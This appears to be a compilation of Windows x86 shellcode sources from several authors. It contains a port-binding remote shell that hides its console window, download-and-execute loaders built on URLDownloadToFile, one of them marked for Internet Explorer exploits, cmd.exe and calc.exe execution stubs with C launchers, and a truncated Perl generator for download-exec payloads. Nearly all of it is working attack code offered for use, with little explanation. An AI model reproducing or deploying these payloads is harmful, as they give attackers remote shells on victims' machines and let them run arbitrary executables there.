    PUSH    EDI                         ;   __out LPTSTR szFileName = &(buffer)
    PUSH    ESI                         ;   __in  LPCSTR szURL = &(url)
    PUSH    ECX                         ;   __in  LPUNKNOWN lpUnkcaller = NULL
    PUSH    EDX                         ; ) return address = LoadLibraryA
    ; Start the ret-into-libc chain:
    JMP     EBP                         ; Jump to URLDownloadToCacheFileA, then return to LoadLibraryA



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; Copyright (c) 2009-2010, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
; Project homepage: http://code.google.com/p/w32-dl-loadlib-shellcode/
; All rights reserved. See COPYRIGHT.txt for details.
BITS 32
; Windows x86 null-free shellcode that executes calc.exe.
; Works in any application for Windows 5.0-7.0 all service packs.
; (See http://skypher.com/wiki/index.php/Hacking/Shellcode).
; This version uses 16-bit hashes.

%include 'w32-exec-calc-shellcode-hash-list.asm'

%define B2W(b1,b2)                      (((b2) << 8) + (b1))
%define W2DW(w1,w2)                     (((w2) << 16) + (w1))
%define B2DW(b1,b2,b3,b4)               (((b4) << 24) + ((b3) << 16) + ((b2) << 8) + (b1))

%ifdef STACK_ALIGN
    AND     SP, 0xFFFC
%endif
find_hash: ; Find ntdll's InInitOrder list of modules:
    XOR     ESI, ESI                    ; ESI = 0
    PUSH    ESI                         ; Stack = 0
    MOV     ESI, [FS:ESI + 0x30]        ; ESI = &(PEB) ([FS:0x30])
    MOV     ESI, [ESI + 0x0C]           ; ESI = PEB->Ldr
    MOV     ESI, [ESI + 0x1C]           ; ESI = PEB->Ldr.InInitOrder (first module)
next_module: ; Get the baseaddress of the current module and find the next module:
    MOV     EBP, [ESI + 0x08]           ; EBP = InInitOrder[X].base_address
    MOV     ESI, [ESI]                  ; ESI = InInitOrder[X].flink == InInitOrder[X+1]
get_proc_address_loop: ; Find the PE header and export and names tables of the module:
    MOV     EBX, [EBP + 0x3C]           ; EBX = &(PE header)
    MOV     EBX, [EBP + EBX + 0x78]     ; EBX = offset(export table)
    ADD     EBX, EBP                    ; EBX = &(export table)
    MOV     ECX, [EBX + 0x18]           ; ECX = number of name pointers
    JCXZ    next_module                 ; No name pointers? Next module.
next_function_loop: ; Get the next function name for hashing:
    MOV     EDI, [EBX + 0x20]           ; EDI = offset(names table)
    ADD     EDI, EBP                    ; EDI = &(names table)
    MOV     EDI, [EDI + ECX * 4 - 4]    ; EDI = offset(function name)
    ADD     EDI, EBP                    ; EDI = &(function name)
    XOR     EAX, EAX                    ; EAX = 0
    CDQ                                 ; EDX = 0
hash_loop: ; Hash the function name and compare with requested hash
    XOR     DL, [EDI]
    ROR     DX, BYTE hash_ror_value
    SCASB
    JNE     hash_loop
    CMP     DX, hash_kernel32_WinExec
    LOOPNE  next_function_loop          ; Not the right hash and functions left in module? Next function
    JNE     next_module                 ; Not the right hash and no functions left in module? Next module
    ; Found the right hash: get the address of the function:
    MOV     EDX, [EBX + 0x24]           ; ESI = offset ordinals table
    ADD     EDX, EBP                    ; ESI = &oridinals table
    MOVZX   EDX, WORD [EDX + 2 * ECX]   ; ESI = ordinal number of function
    MOV     EDI, [EBX + 0x1C]           ; EDI = offset address table
    ADD     EDI, EBP                    ; EDI = &address table
    ADD     EBP, [EDI + 4 * EDX]        ; EBP = &(function)
    ; create the calc.exe string
    PUSH    B2DW('.', 'e', 'x', 'e')    ; Stack = ".exe", 0
    PUSH    B2DW('c', 'a', 'l', 'c')    ; Stack = "calc.exe", 0
    PUSH    ESP                         ; Stack = &("calc.exe"), "calc.exe", 0
    XCHG    EAX, [ESP]                  ; Stack = 0, "calc.exe", 0
    PUSH    EAX                         ; Stack = &("calc.exe"), 0, "calc.exe", 0
    CALL    EBP                         ; WinExec(&("calc.exe"), 0);
    INT3                                ; Crash



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; Copyright (c) 2009-2010, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
; Project homepage: http://code.google.com/p/w32-dl-loadlib-shellcode/
; All rights reserved. See COPYRIGHT.txt for details.
BITS 32
; Windows x86 null-free shellcode that executes calc.exe.
; Works in any application for Windows 5.0-7.0 all service packs.
; (See http://skypher.com/wiki/index.php/Hacking/Shellcode).
; This version uses 16-bit hashes.

%include 'w32-msgbox-shellcode-hash-list.asm'

%define B2W(b1,b2)                      (((b2) << 8) + (b1))
%define W2DW(w1,w2)                     (((w2) << 16) + (w1))
%define B2DW(b1,b2,b3,b4)               (((b4) << 24) + ((b3) << 16) + ((b2) << 8) + (b1))

%ifdef STACK_ALIGN
    AND     SP, 0xFFFC
%endif
find_hash: ; Find ntdll's InInitOrder list of modules:
    XOR     ESI, ESI                    ; ESI = 0
    PUSH    ESI                         ; Stack = 0
    MOV     ESI, [FS:ESI + 0x30]        ; ESI = &(PEB) ([FS:0x30])
    MOV     ESI, [ESI + 0x0C]           ; ESI = PEB->Ldr
    MOV     ESI, [ESI + 0x1C]           ; ESI = PEB->Ldr.InInitOrder (first module)
next_module: ; Get the baseaddress of the current module and find the next module:
    MOV     EBP, [ESI + 0x08]           ; EBP = InInitOrder[X].base_address
    MOV     ESI, [ESI]                  ; ESI = InInitOrder[X].flink == InInitOrder[X+1]
get_proc_address_loop: ; Find the PE header and export and names tables of the module:
    MOV     EBX, [EBP + 0x3C]           ; EBX = &(PE header)
    MOV     EBX, [EBP + EBX + 0x78]     ; EBX = offset(export table)
    ADD     EBX, EBP                    ; EBX = &(export table)
    MOV     ECX, [EBX + 0x18]           ; ECX = number of name pointers
    JCXZ    next_module                 ; No name pointers? Next module.
next_function_loop: ; Get the next function name for hashing:
    MOV     EDI, [EBX + 0x20]           ; EDI = offset(names table)
    ADD     EDI, EBP                    ; EDI = &(names table)
    MOV     EDI, [EDI + ECX * 4 - 4]    ; EDI = offset(function name)
    ADD     EDI, EBP                    ; EDI = &(function name)
    XOR     EAX, EAX                    ; EAX = 0
    CDQ                                 ; EDX = 0
hash_loop: ; Hash the function name and compare with requested hash
    XOR     DL, [EDI]
    ROR     DX, BYTE hash_ror_value
    SCASB
    JNE     hash_loop
    CMP     DX, hash_user32_MessageBoxA
    JE      found_MessageBoxA           ;
    CMP     DX, hash_kernel32_LoadLibraryA
    LOOPNE  next_function_loop          ; Not the right hash and functions left in module? Next function
    JNE     next_module                 ; Not the right hash and no functions left in module? Next module
found_MessageBoxA:
    ; Found the right hash: get the address of the function:
    MOV     EDX, [EBX + 0x24]           ; EDX = offset ordinals table
    ADD     EDX, EBP                    ; EDX = &oridinals table
    MOVZX   EDX, WORD [EDX + 2 * ECX]   ; EDX = ordinal number of function
    MOV     EDI, [EBX + 0x1C]           ; EDI = offset address table
    ADD     EDI, EBP                    ; EDI = &address table
    ADD     EBP, [EDI + 4 * EDX]        ; EBP = &(function)
    TEST    ESI, ESI
    JZ      show_MesageBoxA
    PUSH    B2DW('3', '2', ' ', ' ')    ; Stack = "er32", 0
    PUSH    B2DW('u', 's', 'e', 'r')    ; Stack = "  user32", 0
    PUSH    ESP                         ; Stack = &("  user32"), "  user32", 0
    CALL    EBP                         ; LoadLibraryA(&("  user32"));
    XCHG    EAX, EBP                    ; EBP = &(user32.dll)
    XOR     ESI, ESI                    ; ESI = 0
    PUSH    ESI                         ; Stack = 0, "  user32", 0
    JMP     get_proc_address_loop

show_MesageBoxA:
    ; create the "Hello world!" string
    PUSH    B2DW('r', 'l', 'd', '!')    ; Stack = "rld!", 0, "  user32", 0
    PUSH    B2DW('o', ' ', 'w', 'o')    ; Stack = "o world!", 0, "  user32", 0
    PUSH    B2DW('H', 'e', 'l', 'l')    ; Stack = "Hello world!", 0, "  user32", 0
    PUSH    ESP                         ; Stack = &("Hello world!"), "Hello world!", 0, "  user32", 0
    XCHG    EAX, [ESP]                  ; Stack = 0, "Hello world!", 0, "  user32", 0
    PUSH    EAX                         ; Stack = &("Hello world!"), 0, "Hello world!", 0, "  user32", 0
    PUSH    EAX                         ; Stack = &("Hello world!"), &("Hello world!"), 0, "Hello world!", 0, "  user32", 0
    PUSH    ESI                         ; Stack = 0, &("Hello world!"), &("Hello world!"), 0, "Hello world!", 0, "  user32", 0
    CALL    EBP                         ; MessageBoxA(NULL, &("Hello world!"), &("Hello world!"), MB_OK);
    INT3                                ; Crash



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

BITS 32
; Windows x86 null-free bindshell for Windows 5.0-6.0 all service packs.
; (See http://skypher.com/wiki/index.php/Hacking/Shellcode/Bind/NGS).
; Based largely on code and ideas (C) 2005 by Dafydd Stuttard, NGS Software.
; (See http://www.ngssoftware.com/papers/WritingSmallShellcode.pdf).
; Thanks to Pete Beck.
;
; Features both in this and the original code:
;  + NULL Free
;  + Windows version and service pack independant.
; Improvements of this code over the original:
;  + No assumptions are made about the values of registers.
;  + "/3GB" compatible: pointers are not assume to be smaller than 0x80000000.
;  + DEP/ASLR compatible: data is not executed, code is not modified.
;  + Windows 7 compatible: kernel32 is found based on the length of its name.
;  + Stealth: does not display a console windows on the target machine when 
;    cmd.exe is executed.
;  + Allows an unlimited number of consecutive connections.
;  + Can except connections on almost any port. The range of acceptable port
;    numbers is only limited by the fact that the negative value of the port
;    number must not contain nulls.

port equ 28876                          ; The port number to bind to.

%if ((-port & 0xFF) == 0) || (-port & 0xFF00 == 0)
  %error The given port number would result in NULLs in the code :(
%endif

AF_INET                                 equ 2

; These hashes are calculated with a separate tool.
hash_kernel32_CreateProcessA            equ 0x81
hash_kernel32_LoadLibraryA              equ 0x59
hash_ws2_32_WSAStartup                  equ 0xD3
hash_ws2_32_WSASocket                   equ 0x62
hash_ws2_32_bind                        equ 0x30
hash_ws2_32_listen                      equ 0x20
hash_ws2_32_accept                      equ 0x41
sizeof_proc_address_table               equ 7 * 4
offset_WSAStartup_in_hash_table         equ 2

%define B2W(b1,b2)                      (((b2) << 8) + (b1))
%define W2DW(w1,w2)                     (((w2) << 16) + (w1))
%define B2DW(b1,b2,b3,b4)               (((b4) << 24) + ((b3) << 16) + ((b2) << 8) + (b1))

start:
    XOR     ECX, ECX                    ; ECX = 0
; Find base address of kernel32.dll. This code should work on Windows 5.0-7.0
    MOV     ESI, [FS:ECX + 0x30]        ; ESI = &(PEB) ([FS:0x30])
    MOV     ESI, [ESI + 0x0C]           ; ESI = PEB->Ldr
    MOV     ESI, [ESI + 0x1C]           ; ESI = PEB->Ldr.InInitOrder (first module)
next_module:
    MOV     EBP, [ESI + 0x08]           ; EBP = InInitOrder[X].base_address
    MOV     EDI, [ESI + 0x20]           ; EDI = InInitOrder[X].module_name (unicode string)
    MOV     ESI, [ESI]                  ; ESI = InInitOrder[X].flink (next module)
    CMP     [EDI + 12*2], CL            ; modulename[12] == 0 ? strlen("kernel32.dll") == 12
    JNE     next_module                 ; No: try next module.

; Create hash table and "ws2_32" (for LoadLibraryA) on the stack:
    PUSH    BYTE '2'                    ; Stack = "2"
    PUSH    B2DW('s', '2', '_', '3')    ; Stack = "s2_32"
    PUSH    B2DW(hash_ws2_32_bind, hash_ws2_32_listen, hash_ws2_32_accept, 'w') ; hash, hash, "ws2_32"
end_of_hash_table_marker                equ 'w'
    PUSH    B2DW(hash_kernel32_CreateProcessA, hash_kernel32_LoadLibraryA, hash_ws2_32_WSAStartup, hash_ws2_32_WSASocket)
sizeof_hash_table                       equ 7
    MOV     ESI, ESP                    ; ESI -> Hash table
; Reserve space for WSADATA
    MOV     CH, 0x3                     ; ECX = 0x300
    SUB     ESP, ECX                    ; Reserve space for WSADATA
; Create a bunch of NULLs on the stack
    SUB     ESP, ECX                    ; Reserve space for NULLs
    MOV     EDI, ESP                    ; EDI = &(NULLs)
    SALC                                ; AL = 0
    REP STOSB                           ;
; Prepare arguments for various functions on the stack:
; WSASocket(__in int af=2, __in int type=1, __in int protocol=0,
;            __in LPWSAPROTOCOL_INFO lpProtocolInfo=0, __in GROUP g=0, 
;            __in DWORD dwFlags=0)
                                        ; __in LPWSAPROTOCOL_INFO lpProtocolInfo=0
                                        ; __in GROUP g=0
                                        ; __in DWORD dwFlags=0
                                        ; __in int protocol=0
    INC     ECX                         ;
    PUSH    ECX                         ; __in int type = SOCK_STREAM (1)
    INC     ECX                         ;
    PUSH    ECX                         ; __in int af = AF_INET (2)
; WSAStartup(__in WORD wVersionRequested=2, __out LPWSADATA lpWSADATa=stack)
    PUSH    EDI                         ; __out LPWSADATA lpWSAData = &(WSADATA)
    PUSH    ECX                         ; __in WORD wVersionRequested = 2 (2.0)
; Set up EDI so that a proc addresses table can be created in the NULLs,
; followed by sufficient space to store a struct sockaddr_in:
    SUB     EDI, BYTE sizeof_proc_address_table + sizeof_sockaddr_in

get_proc_address_loop:
    MOVSB                               ; [EDI] = hash
    DEC     EDI                         ; Restore EDI
; Find the PE header and export and names tables of the module:
    MOV     EBX, [EBP + 0x3C]           ; EBX = &(PE header)
    MOV     EBX, [EBP + EBX + 0x78]     ; EBX = offset(export table)
    ADD     EBX, EBP                    ; EBX = &(export table)
    MOV     ECX, [EBX + 0x20]           ; ECX = offset(names table)
    ADD     ECX, EBP                    ; ECX = &(names table)
    PUSH    ESI                         ; Save ESI
; Hash each function name and check it against the requested hash:
    XOR     EDX, EDX                    ; EDX = function number (0)
next_function_loop:
; Get the next function name:
    INC     EDX                         ; Increment function number
    MOV     ESI, [ECX + EDX * 4]        ; ESI = offset(function name)
    ADD     ESI, EBP                    ; ESI = &(function name)
    XOR     EAX, EAX                    ; EAX = 0
hash_loop:
; Hash the function name:
    LODSB                               ; Load a character of the function name
    XOR     AL, 0x71                    ; Calculate a hash
    SUB     AH, AL                      ;
    CMP     AL, 0x71                    ; Is this the terminating 0 byte?
    JNE     hash_loop                   ; No: continue hashing
    CMP     AH, [EDI]                   ; Yes: Does the hash match ?
; Check if the hash matches and loop if not:
    JNZ     next_function_loop
    POP     ESI                         ; Restore ESI
; Find the address of the requested function:
    MOV     ECX, [EBX + 0x24]           ; ECX = offset ordinals table
    ADD     ECX, EBP                    ; ECX = &oridinals table
    MOVZX   EDX, WORD [ECX + 2 * EDX]   ; EDX = ordinal number of function
    MOV     ECX, [EBX + 0x1C]           ; ECX = offset address table
    ADD     ECX, EBP                    ; ECX = &address table
    MOV     EAX, EBP                    ; EAX = &(module)
    ADD     EAX, [ECX + 4 * EDX]        ; EAX = &(function)
; Save the address of the requested function:
    STOSD                               ; Save proc address
; When needed, call LoadLibraryA to start looking for ws2_32.dll functions:
    CMP     BYTE [ESI], hash_ws2_32_WSAStartup ; We just found LoadLibraryA
    JNE     skip_load_library           ;
    LEA     EBX, [ESI - offset_WSAStartup_in_hash_table + sizeof_hash_table]
    PUSH    EBX                         ; __in LPCTSTR lpFileName = &("ws2_32")
    CALL    EAX                         ; LoadLibraryA(&"ws2_32") 
    PUSH    EDI                         ; Save proc address table[WSAStartup]
    XCHG    EAX, EBP                    ; EBP = &(ws2_32.dll)
skip_load_library:
; Continue until all hashes have been found:
    CMP     BYTE [ESI], end_of_hash_table_marker
    JNE     get_proc_address_loop       ;
    POP     ESI
; Call WSAStartup (Arguments are already on the stack)
    LODSD
    CALL    EAX                         ; WSASTARTUP
; Call WSASocket (Arguments are already on the stack)
    LODSD
    CALL    EAX
    XCHG    EAX, EBP                    ; EBP = Server socket

; Create a struct sockaddr_in on the stack for use by bind()
sizeof_sockaddr_in equ 2 + 2 + 4 + 8
    SUB     DWORD [EDI], -W2DW( AF_INET, B2W(port >> 8, port & 0xFF)); sin_family = AF_INET, sin_port = (port, little endian!)
; Set up the 2nd and 3rd argument for bind:
;   bind(__in SOCKET s=(added later), __in const struct sockaddr *name, __in int namelen)
    PUSH    BYTE 0x10                   ; __in int namelen = 0x10
    PUSH    EDI                         ; __in const struct sockaddr *name = &(sockaddr_in)
; bind(), listen() and accept() all take the server socket as their first
; argument. listen() and accept() only need NULLs for the remaining arguments
; and the arguments for bind() are already on the stack. Because bind() and 
; accept() return 0 and listen() returns a socket, which is not 0, a loop can be
; used to call them:
;   listen(__in SOCKET s=(added later), __in int backlog=0)
;   accept(__in SOCKET s=(added later), __in struct sockaddr *addr=0, __inout int *addrlen=0)
call_loop:
    LODSD
accept_loop:
    PUSH    EBP                         ; __in SOCKET s = Server socket descriptor
    CALL    EAX
; Check if accept() has returned a socket:
    TEST    EAX, EAX
    JZ      call_loop

; Create structures on the stack for CreateProcessA
; STARTUPINFO {
;   DWORD cb                            00-03: >= sizeof(STARTUPINFO)
;   LPTSTR lpReserved                   04-07: 0
;   LPTSTR lpDesktop                    08-0B: 0
;   LPTSTR lpTitle                      0C-0F: 0
;   DWORD dwX                           10-13: 0
;   DWORD dwY                           14-17: 0
;   DWORD dwXSize                       18-1B: 0
;   DWORD dwYSize                       1C-1F: 0
;   DWORD dwXCountChars                 20-23: 0
;   DWORD dwYCountChars                 24-27: 0
;   DWORD dwFillAttribute               28-2B: 0
;   DWORD dwFlags                       2C-2F: (STARTF_USESTD_HANDLES 0x100)
;   WORD wShowWindow                    30-31: 0
;   WORD cbReserved2                    32-33: 0
;   LPBYTE lpReserved2                  34-37: 0
;   HANDLE hStdInput                    38-3B: (Socket descriptor)
;   HANDLE hStdOutput                   3C-3F: (Socket descriptor)
;   HANDLE hStdError                    40-43: (Socket descriptor)
; }
sizeof_STARTUPINFO                      equ 0x44
offset_dwFlags_in_STARTUPINFO           equ 0x2C
offset_hStdInput_in_STARTUPINFO         equ 0x38
; Each call to accept() removes two DWORDS off the stack. These must be put back
; or ESP will run off the stack eventually:
    XOR     EDX, EDX                    ; EDX = 0
    PUSH    EDX                         ; Restore stack #1
; We'll also create a struct STARTUPINFO
    PUSH    B2DW('c', 'm', 'd', ' ')    ; Restore stack #2 and STARTUPINFO.cb = "cmd " (> 0)
    LEA     EDI, [ESP + offset_hStdInput_in_STARTUPINFO]; EDI = &(STARTUPINFO.hStdInput)
    STOSD                               ; STARTUPINFO.hStdInput = Socket descriptor
    STOSD                               ; STARTUPINFO.hStdOutput = Socket descriptor
    STOSD                               ; STARTUPINFO.hStdError = Socket descriptor
    MOV     BYTE [EDI - sizeof_STARTUPINFO + offset_dwFlags_in_STARTUPINFO + 1], 1 ; STARTUPINFO.dwFlags = STARTF_USESTDHANDLES (0x100)
; CreateProcess(...)
    PUSH    ESP                         ; __out LPPROCESS_INFORMATION lpProcessInformation == &(STARTUPINFO)
    XCHG    [ESP], EDI                  ; __out LPPROCESS_INFORMATION lpProcessInformation == &(STARTUPINFO) + sizeof(STARTUPINFO)
    PUSH    EDI                         ; __in LPSTARTUPINFO lpStartupInfo == &(STARTUPINFO)
    PUSH    EDX                         ; __in_opt LPCTSTR lpCurrentDirectory = NULL
    PUSH    EDX                         ; __in_opt LPVOID lpEnvironment = NULL
    PUSH    EDX                         ; __in DWORD dwCreationFlags = 0
    MOV     BYTE [EDI-5*4+3], 0x8       ; __in DWORD dwCreationFlags = CREATE_NO_WINDOW (0x08000000)
    PUSH    EDI                         ; __in BOOL bInheritHandles = TRUE (>0)
    PUSH    EDX                         ; __in_opt LPSECURITY_ATTRIBUTES lpThreadAttributes = NULL
    PUSH    EDX                         ; __in_opt LPSECURITY_ATTRIBUTES lpProcessAttributes = NULL
    PUSH    EDI                         ; __inout_opt LPTSTR lpCommandLine = &("cmd ")
    PUSH    EDX                         ; __in_opt LPCTSTR lpApplicationName = NULL
    CALL    [ESI - sizeof_proc_address_table]
; Load accept() into EAX and jump back into our code.
    MOV     EAX, [ESI - 4]
    JMP     accept_loop





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
windows/XP sp2 (FR) Sellcode cmd.exe 32 bytes
Author : Mountassif Moad
Big Thnx : Houssamix & SimO-s0fT
Changed by : Stack
Description : It is 32 Byte Shellcode which Execute Cmd.exe Tested Under Windows Xp SP2 FR
My first original shellcode Here http://www.milw0rm.com/shellcode/7971
because i receive every day full message who insult me (you'r lamer - fucker ->
you dont understand anything abouts sec )  infinity of insult
and the last time i receive an message have  => i make full error in my first shelcode & in the end he
insult my mother & me (shit)
so i tell all people when want insult anyone remembers we are just human not angel
euuuh : i'm decide to write another small shellcode this time just for fun (32 bytes xd )
Assembly Code : this time is not a secret (:@)
00402000   8BEC             MOV EBP,ESP
00402002   33FF             XOR EDI,EDI
00402004   57               PUSH EDI
00402005   C645 FC 63       MOV BYTE PTR SS:[EBP-4],63
00402009   C645 FD 6D       MOV BYTE PTR SS:[EBP-3],6D
0040200D   C645 FE 64       MOV BYTE PTR SS:[EBP-2],64
00402011   C645 F8 01       MOV BYTE PTR SS:[EBP-8],1
00402015   8D45 FC          LEA EAX,DWORD PTR SS:[EBP-4]
00402018   50               PUSH EAX
00402019   B8 C793BF77      MOV EAX,msvcrt.system (i notice this for work in other machine)
0040201E   FFD0             CALL EAX
*/
#include "stdio.h"
unsigned char shellcode[] =
"\x8B\xEC\x33\xFF\x57"
"\xC6\x45\xFC\x63\xC6\x45"
"\xFD\x6D\xC6\x45\xFE\x64"
"\xC6\x45\xF8\x01\x8D"
"\x45\xFC\x50\xB8\xC7\x93"
"\xBF\x77\xFF\xD0";
int main ()
{
int *ret;
ret=(int *)&ret+2;
printf("Shellcode Length is : %d\n",strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
win32/xp sp2 (En) cmd.exe 23 bytes
Author : Mountassif Moad
A.K.A : Stack
Description : It's a 23 Byte Shellcode which Execute Cmd.exe Tested Under Windows Xp SP2 En

get the following if we disassemle this code compiled with olly debugger
 
00402000  > 8BEC             MOV EBP,ESP
00402002  . 68 65786520      PUSH 20657865
00402007  . 68 636D642E      PUSH 2E646D63
0040200C  . 8D45 F8          LEA EAX,DWORD PTR SS:[EBP-8]
0040200F  . 50               PUSH EAX
00402010  . B8 8D15867C      MOV EAX,kernel32.WinExec
00402015  . FFD0             CALL EAX
*/
#include <stdio.h>
unsigned char shellcode[] =
                        "\x8b\xec\x68\x65\x78\x65"
                        "\x20\x68\x63\x6d\x64\x2e"
                        "\x8d\x45\xf8\x50\xb8\x8D"
                        "\x15\x86\x7C\xff\xd0";
int main ()
{
int *ret;
ret=(int *)&ret+2;
printf("Shellcode Length is : %d\n",strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title: Windows XP Professional SP2 ita calc.exe shellcode 36 bytes
Type: Shellcode
Author: Stoke
Platform: win32
Tested on: Windows XP Professional SP2 ita
*/
 
#include <stdio.h>
#include <string.h>
 
int main() {
char shell[] = 	"\xeb\x16\x5b\x31\xc0\x50\x53\xbb"
		"\x8d\x15\x86\x7c\xff\xd3\x31\xc0"
		"\x50\xbb\xea\xcd\x81\x7c\xff\xd3"
		"\xe8\xe5\xff\xff\xff\x63\x61\x6c"
		"\x63\x2e\x65\x78\x65";

printf("Shellcode lenght %d\n", strlen(shell));
getchar();
((void (*)()) shell)();
return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

;
; relocateable dynamic runtime assembly code example using hash lookup
;
; WinExec() with ExitThread()
; 104 bytes
;
; for testing:
;
; ml /c /coff /Cp wexec2.asm
; link /subsystem:windows /section:.text,w wexec2.obj
;
; wyse101 [at] gmail.com
;
; October 2006
;
.386
.model flat,stdcall

ROL_CONSTANT equ 5

mrol macro iNum:req,iBits:req
   exitm <(iNum shl iBits) or (iNum shr (32-iBits))>
endm

mror macro iNum:req,iBits:req
   exitm <(iNum shr iBits) or (iNum shl (32-iBits))>
endm

hashapi macro szApi
   local dwApi

   dwApi = 0

   forc x,szApi
      dwApi = dwApi + '&x'
      dwApi = mrol(dwApi,ROL_CONSTANT)
   endm
   dwApi = mrol(dwApi,ROL_CONSTANT)
   dw (dwApi and 0ffffh)
endm

.code

   assume fs:nothing

code_start:
   jmp load_data
setup_parameters:
   pop ebp
   xor ecx,ecx
   push ecx                                 ; ExitThread() exitcode
   push ecx                                 ; SW_HIDE
   mov cl,(cmd_end-api_hashes)              ; limit of 255 bytes per command
   inc byte ptr[ebp+ecx]
   lea eax,[ebp+(cmd_string-api_hashes)]
   push eax                                 ; WinExec command string
get_k32_base:
   mov cl,30h
   mov eax,fs:[ecx]
   mov eax,[eax+0ch]
   mov esi,[eax+1ch]
   lodsd
   mov ebx,[eax+08h]
get_api_loop:
   mov eax,[ebx+3ch]
   mov eax,[ebx+eax+78h]
   lea esi,[ebx+eax+1ch]
   mov cl,3
load_rva:
   lodsd
   add eax,ebx
   push eax
   loop load_rva
   pop ebp
   pop edi
load_api:
   mov esi,[edi+4*ecx]
   add esi,ebx
   xor eax,eax
   cdq
hash_api:
   lodsb
   add edx,eax
   rol edx,ROL_CONSTANT
   dec eax
   jns hash_api
   inc ecx
   mov eax,[esp+4]
   cmp dx,word ptr[eax]
   jne load_api
   pop eax
   movzx edx,word ptr[ebp+2*ecx-2]
   add ebx,[eax+4*edx]
   pop esi
   call ebx
   lodsw
   jmp get_k32_base
load_data:
   call setup_parameters
api_hashes:
   hashapi <WinExec>
   hashapi <ExitThread>
code_end:

cmd_string db 'cmd /c echo hello,world>test.txt && notepad test.txt',0ffh
cmd_end equ $-1

end code_start





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

;
; relocateable dynamic runtime assembly code example using hash lookup *** for IE exploits only ***
; the URLMON.DLL must already be loaded into the process space for this to work, so do not run on its own!!
;
; to test use /DTEST_CODE in ml command line
;
; URLDownLoadToFileA() / WinExec() / ExitProcess() | ExitThread()
;
; 124 bytes
;
; for testing:
;
; ml /c /coff /Cp /DTEST_CODE dexec32.asm
; link /subsystem:windows /section:.text,w dexec32.obj urlmon.lib
;
; wyse101 [at] gmail.com
;
; March 2007
;
      .386
      .model flat,stdcall

      ROL_CONSTANT equ 5

      mrol macro iNum:req,iBits:req
           exitm <(iNum shl iBits) or (iNum shr (32-iBits))>
      endm

      mror macro iNum:req,iBits:req
           exitm <(iNum shr iBits) or (iNum shl (32-iBits))>
      endm

      hashapi macro szApi
              local dwApi

              dwApi = 0

              forc x,szApi
                   dwApi = dwApi + '&x'
                   dwApi = mrol(dwApi,ROL_CONSTANT)
              endm
              dwApi = mrol(dwApi,ROL_CONSTANT)
              dw (dwApi and 0ffffh)
      endm

      .code

      assume fs:nothing

code_start:
      jmp load_data
IFDEF TEST_CODE
extern URLDownloadToFileA   :proc
      call URLDownloadToFileA                     ; included when assembled with /DTEST_CODE
ENDIF
setup_parameters:
      pop edi                                     ; offset @cmd_start
      xor eax,eax                                 ; eax = 0
      cdq                                         ; edx = 0
      ; ********************************************************************
      push eax                                    ; exit code  = 0
      ; ********************************************************************
      push eax                                    ; SW_HIDE
      mov dl,(@cmd_end-@cmd_start)-1              ; this allows command up to 255 bytes
      push edi                                    ; file name to execute
      ; ********************************************************************
      push eax                                    ; callback routine URLDownLoadToFileA
      push eax                                    ; reserved, must be zero
      push edi                                    ; file name to save as
      add edi,edx                                 ; get offset of @url_start-1
      stosb                                       ; zero tail end
      mov dl,(@url_end-@url_start)-1              ; limit of 255 bytes for url
      push edi                                    ; url to download file from
      push eax                                    ; interface
      add edi,edx                                 ; get offset of @urlmon-1
      stosb                                       ; zero tail end of url
      ; *********************************************************************
load_modules:
      push edi                   ; save current offset to hashes
      push 30h
      pop ecx
      mov eax,fs:[ecx]           ; PEB base address
      mov eax,[eax+0ch]          ; PEB_LDR_DATA LoaderData
      mov ebp,[eax+1ch]          ; LIST_ENTRY InMemoryOrderModuleList
scan_dll:
      mov ebx,[ebp+8]            ; DllBase
      mov ebp,[ebp]              ; Flink
      push ebp                   ; save

      mov eax,[ebx+3ch]
      mov eax,[ebx+eax+78h]	 ; IMAGE_DIRECTORY_ENTRY_EXPORT
      lea esi,[ebx+eax+18h]	 ; offset IMAGE_EXPORT_DIRECTORY.NumberOfNames
      lodsd
      xchg eax,ecx               ; ecx = NumberOfNames
      
      lodsd
      add eax,ebx                ; AddressOfFunctions
      push eax

      lodsd
      lea edi,[eax+ebx]          ; AddressOfNames

      lodsd
      lea ebp,[eax+ebx]		 ; ebp = AddressOfNameOrdinals
load_api:
      mov esi,[edi+4*ecx-4]
      add esi,ebx
      xor eax,eax
      cdq
hash_api:
      lodsb
      add edx,eax
      rol edx,ROL_CONSTANT
      dec eax
      jns hash_api

      mov esi,[esp+8]                             ; get api hashes
      cmp dx,word ptr[esi]                        ; found a match?
      je call_api

      loop load_api
      pop eax                                     ; check
      pop ebp                                     ;
      jmp scan_dll
call_api:
      pop eax
      movzx edx,word ptr [ebp+2*ecx-2]
      add ebx,[eax+4*edx]
      pop ebp                                     ; modules
      pop edi                                     ; api hashes
      call ebx                                    ; call api
      stosw                                       ; advance 2 bytes to next hash
      jmp load_modules                             ; do another, just keep going until ExitProcess is reached.
      ; *************************
load_data:
      call setup_parameters
@cmd_start:
      db 'file.exe',0ffh                          ; WinExec("file.exe",SW_HIDE);
@cmd_end:
@url_start:
      db 'http://127.0.0.1/file.exe',0ffh         ; url of file to download
@url_end:
      hashapi <URLDownloadToFileA>
      hashapi <WinExec>
      hashapi <ExitProcess>
      ; *********************************************************************

end code_start




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#!/usr/bin/perl

$loading_url=$ARGV[0];
chomp ($loading_url);
my @buffer;

if ($loading_url eq "") {
$sco = 'ERROR!!! Enter url to remote exe.';
buffer_gen($sco);
print @buffer;
exit;
}

$c= generate_char(0);

$sco= "\xE8\x56\x00\x00\x00\x53\x55\x56\x57\x8B\x6C\x24\x18\x8B\x45".
